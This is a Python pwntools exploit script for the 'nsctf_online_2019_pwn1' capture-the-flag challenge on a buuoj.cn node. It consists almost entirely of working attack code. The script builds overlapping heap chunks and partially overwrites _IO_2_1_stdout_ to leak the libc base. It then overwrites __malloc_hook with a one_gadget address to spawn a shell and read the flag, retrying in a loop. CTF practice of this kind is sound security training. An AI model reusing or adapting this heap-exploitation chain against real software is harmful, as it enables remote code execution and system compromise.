#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/27 17:23:56
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('./nsctf_online_2019_pwn1')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = 'node4.buuoj.cn'
    port = 28479
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('./nsctf_online_2019_pwn1')

_IO_2_1_stdout_s = libc.symbols['_IO_2_1_stdout_']
def debug():
    gdb.attach(sh)
    pause()
def cmd(choice):
    sh.recvuntil("5.exit\n")
    sh.sendline(str(choice))

def add(size,content):
    cmd(1)
    sh.recvuntil("Input the size:\n")
    sh.sendline(str(size))
    sh.recvuntil("Input the content:")
    sh.send(content)


def dele(idx):
    cmd(2)
    sh.recvuntil("Input the index:\n")
    sh.sendline(str(idx))


def edit(idx,size,content):
    cmd(4)
    sh.recvuntil("Input the index:\n")
    sh.sendline(str(idx))
    sh.recvuntil("Input size:\n")
    sh.sendline(str(size))
    sh.recvuntil("Input new content:\n")
    sh.send(content)

def pwn():
    add(0x80,'a') #0
    add(0x68,'a') #1
    add(0xf0,'a') #2
    add(0x10,'a') #3
    dele(0)
    payload = 'a' * 0x60 + p64(0x70+0x90)
    edit(1,len(payload),payload)
    dele(2)
    add(0x80,'a') #0
    add(0x68,'a') #2
    add(0xf0,'a') #4
    dele(0)
    edit(1,len(payload),payload)
    dele(4)
    dele(1)
    add(0x80,'a') #0
    dele(0)
    # debug()
    payload = 'a'*0x80 + p64(0) + p64(0x71) + p16((2 << 12) + ((_IO_2_1_stdout_s-0x43) & 0xFFF))
    add(len(payload),payload)  #0
    payload = "\x00" * 0x33 + p64(0x0FBAD1887) + p64(0) * 3 + p8(0x88)
    add(0x60,'a') #1
    add(0x59,payload) #4
    libc_base = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00")) - libc.symbols['_IO_2_1_stdin_']
    log.info("libc_base=>{}".format(hex(libc_base)))
    malloc_hook = libc_base + libc.symbols['__malloc_hook']
    one = libc_base + one_offset[3] 
    dele(1)
    edit(2,8,p64(malloc_hook-0x23))
    add(0x60,'a')
    add(0x60,'\x00'*0x13+p64(one))
    cmd(1)
    # pause()
    sh.sendline("1")
    sh.sendline("cat flag   ")
    sh.interactive()

while True:
    try:
        global sh
        # sh = process('./nsctf_online_2019_pwn1')
        sh = remote(IP,port)
        pwn()
    except:
        sh.close()
        print("trying...")
# pwn()